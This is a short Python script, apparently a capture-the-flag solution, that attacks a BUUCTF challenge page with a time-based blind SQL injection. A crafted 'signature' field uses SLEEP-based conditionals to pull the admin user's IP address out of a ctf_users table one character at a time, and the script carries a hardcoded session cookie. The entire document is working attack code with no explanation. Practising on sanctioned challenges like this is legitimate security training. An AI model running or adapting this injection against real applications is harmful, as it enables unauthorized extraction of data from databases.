import requests

url="http://309c691b-fc29-404e-8cc7-4428e007a846.node3.buuoj.cn/index.php?action=publish"
cookie = {"PHPSESSID":"t5qk6m7tgvo030lefm0611sh95"}

# k="abcdefghijklmnopqrstuvwxyz0123456789@_.ABCDEFGHIJKLMNOPQRSTUVWXYZ"
k="0123456789."
flag=""

for i in range(50): 
    for j in k:
        j = ord(j)
        data={
            'mood':'0',
            'signature':'1`,if(ascii(substr((select ip from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)
            }
        try:
            r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))
        except:
            flag+=chr(j)
            print(flag)
            break